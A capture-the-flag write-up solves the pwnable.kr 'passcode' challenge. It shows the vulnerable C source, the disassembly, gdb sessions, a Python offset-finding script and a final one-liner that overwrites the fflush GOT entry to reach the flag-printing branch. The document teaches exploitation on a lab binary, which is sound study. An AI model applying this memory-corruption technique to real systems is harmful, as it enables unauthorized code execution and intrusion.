# passcode

pwnable.kr attribution: this challenge comes from <https://pwnable.kr>, and I may reproduce parts of the challenge as visible from there for easier reference.

We're back to the `ssh`-based setup, and doing a quick `ls -l`, we see a similar `sgid`, protected flag, etc... setup as before.

```
passcode@pwnable:~$ ls -l
total 16
-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
-r-xr-sr-x 1 root passcode_pwn 7485 Jun 26  2014 passcode
-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
```

`passcode.c`'s contents are as follows

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

Quickly orienting ourselves to where the bug might be, the hint was

```
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?
```

If we download the code off of the `pwnable` machine (just so it's more convenient to run tools on our local machine; alternatively, you could create a folder ad do work in `/tmp` using what's available on the `pwnable` machine), we can get some indication as to what those warnings were.

```
$ scp -P2222 passcode@pwnable.kr:passcode .
$ scp -P2222 passcode@pwnable.kr:passcode.c .
$ gcc -Wall -Wpedantic -Werror passcode.c
passcode.c: In function ‘login’:
passcode.c:9:17: error: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Werror=format=]
    9 |         scanf("%d", passcode1);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
passcode.c:14:17: error: format ‘%d’ expects argument of type ‘int *’, but argument 2 has type ‘int’ [-Werror=format=]
   14 |         scanf("%d", passcode2);
      |                ~^   ~~~~~~~~~
      |                 |   |
      |                 |   int
      |                 int *
passcode.c:9:9: error: ‘passcode1’ is used uninitialized [-Werror=uninitialized]
    9 |         scanf("%d", passcode1);
      |         ^~~~~~~~~~~~~~~~~~~~~~
passcode.c:5:13: note: ‘passcode1’ was declared here
    5 |         int passcode1;
      |             ^~~~~~~~~
passcode.c:14:9: error: ‘passcode2’ is used uninitialized [-Werror=uninitialized]
   14 |         scanf("%d", passcode2);
      |         ^~~~~~~~~~~~~~~~~~~~~~
passcode.c:6:13: note: ‘passcode2’ was declared here
    6 |         int passcode2;
      |             ^~~~~~~~~
cc1: all warnings being treated as errors
```

So, we have two primary errors: the `scanf`s are passing `int`s when they should be passing `int *`s (since they need to write back to the `int`), and those `int`s are uninitialized[^1]. Since they're uninitialized, our first question should be where they get their value, and if we look closely at the disassembly (or we decompile, or we just guess), we can see that `passcode1`'s position in `login`'s stack frame overlaps with the position of `name` in `welcome`. So, we have control over where `passcode1` "points" (while it's declared as an `int`, for the purposes of the `scanf` it's an `int*`) and what 4 bytes get written there (we have a 32-bit binary).

We can use the disassembly and `gdb` to help us in crafting our exploit. The disassembly is as follows.

```
$ objdump --disassemble=login passcode 
08048564 <login>:
 8048564:       55                      push   %ebp
 8048565:       89 e5                   mov    %esp,%ebp
 8048567:       83 ec 28                sub    $0x28,%esp
 804856a:       b8 70 87 04 08          mov    $0x8048770,%eax
 804856f:       89 04 24                mov    %eax,(%esp)
 8048572:       e8 a9 fe ff ff          call   8048420 <printf@plt>
 8048577:       b8 83 87 04 08          mov    $0x8048783,%eax
 804857c:       8b 55 f0                mov    -0x10(%ebp),%edx
 804857f:       89 54 24 04             mov    %edx,0x4(%esp)
 8048583:       89 04 24                mov    %eax,(%esp)
 8048586:       e8 15 ff ff ff          call   80484a0 <__isoc99_scanf@plt>
 804858b:       a1 2c a0 04 08          mov    0x804a02c,%eax
 8048590:       89 04 24                mov    %eax,(%esp)
 8048593:       e8 98 fe ff ff          call   8048430 <fflush@plt>
 8048598:       b8 86 87 04 08          mov    $0x8048786,%eax
 804859d:       89 04 24                mov    %eax,(%esp)
 80485a0:       e8 7b fe ff ff          call   8048420 <printf@plt>
 80485a5:       b8 83 87 04 08          mov    $0x8048783,%eax
 80485aa:       8b 55 f4                mov    -0xc(%ebp),%edx
 80485ad:       89 54 24 04             mov    %edx,0x4(%esp)
 80485b1:       89 04 24                mov    %eax,(%esp)
 80485b4:       e8 e7 fe ff ff          call   80484a0 <__isoc99_scanf@plt>
 80485b9:       c7 04 24 99 87 04 08    movl   $0x8048799,(%esp)
 80485c0:       e8 8b fe ff ff          call   8048450 <puts@plt>
 80485c5:       81 7d f0 e6 28 05 00    cmpl   $0x528e6,-0x10(%ebp)
 80485cc:       75 23                   jne    80485f1 <login+0x8d>
 80485ce:       81 7d f4 c9 07 cc 00    cmpl   $0xcc07c9,-0xc(%ebp)
 80485d5:       75 1a                   jne    80485f1 <login+0x8d>
 80485d7:       c7 04 24 a5 87 04 08    movl   $0x80487a5,(%esp)
 80485de:       e8 6d fe ff ff          call   8048450 <puts@plt>
 80485e3:       c7 04 24 af 87 04 08    movl   $0x80487af,(%esp)
 80485ea:       e8 71 fe ff ff          call   8048460 <system@plt>
 80485ef:       c9                      leave
 80485f0:       c3                      ret
 80485f1:       c7 04 24 bd 87 04 08    movl   $0x80487bd,(%esp)
 80485f8:       e8 53 fe ff ff          call   8048450 <puts@plt>
 80485fd:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
 8048604:       e8 77 fe ff ff          call   8048480 <exit@plt>
```

In thinking about how to do the exploit, we may be tempted to overwrite the return value on the stack to just be 0x80485d7 (the address of the "success" branch), but because of [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization), this becomes a little harder. Instead, we'll make use of the Procedure Linkage Table (PLT), and try to overwrite where the `fflush` call ends up going.

```
$ gdb passcode
(gdb) b *0x8048593
Breakpoint 1 at 0x8048593
(gdb) r
Starting program: passcode 
Toddler's Secure Login System 1.0 beta.
enter you name : me
Welcome me!
enter passcode1 : 1

Breakpoint 1, 0x08048593 in login ()
(gdb) si
0x08048430 in fflush@plt ()
(gdb) disass $pc
Dump of assembler code for function fflush@plt:
=> 0x08048430 <+0>:     jmp    *0x804a004
```

So, we just need to modify `0x804a004` to be the address in `login` we want to return to. Now, we just need to figure out what part of `name` overlaps with `passcode1`. There are many ways to do it (read the disassembly and manually look at the stack frames, guess and check (using gdb), etc...), but I'll do a cute solution that uses `python` to do a binary search using `gdb`.

First, note that in a dynamic analysis, we can get the value of `passcode1` by looking at `-0x10(%ebp)` at `0x804858b`.

```
 804857c:       8b 55 f0                mov    -0x10(%ebp),%edx
 804857f:       89 54 24 04             mov    %edx,0x4(%esp)
 8048583:       89 04 24                mov    %eax,(%esp)
 8048586:       e8 15 ff ff ff          call   80484a0 <__isoc99_scanf@plt>
 804858b:       a1 2c a0 04 08          mov    0x804a02c,%eax
```

```python3
# Saved as find.py
import subprocess

gdb_commands = b"""
break *0x804858b
commands
x/wx $ebp - 0x10
end
run
""".lstrip()

lo = 0
hi = 200
while lo < hi:
    mid = (lo + hi) // 2
    out = subprocess.run(
        ["gdb", "passcode"],
        stdout=subprocess.PIPE,
        input=gdb_commands + b"a"*mid + b"\n"
    ).stdout.decode().splitlines()
    out = iter(out)
    for line in out:
        if line.startswith("Breakpoint 1"):
            val = next(out).split()[1]
            if val == "0x61616161":
                hi = mid
            else:
                lo = mid + 1
            break
    else:
        print(f"Did not find val when using {mid} a's")
        exit(1)

print(f"Overwritten completely at {lo} a's")
```

```
$ python3 find.py
Overwritten completely at 100 a's
```

Which, to be fair, is probably what one would guess if they had one guess. But, this gives us everything we need for the exploit: we can use name to set `passcode1` to 0x804a004 and then write the value 0x80485d7 = 134514135 to it. Using a really long one-liner: `python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 96 + 0x804a004.to_bytes(4, "little") + b"\n134514135\n")' | ./passcode`, we obtain the flag.

To expand upon later:

* pass-by-ref vs pass-by-copy and C semantics vs (e.g.,) Python, C++
* plt/got/linker/airs 20 part series
* see if personality lets us beat ASLR
* parenthetical in footnote 1
* avoiding spaces in `scanf("%100s")` call

[^1]: Interestingly, although `clangd` tells me about the problem with the 3rd `scanf` call (off-by-one on the buffer size), `gcc` did not report it (I have not yet investigated whether fixing the first two errors lets it report the third).
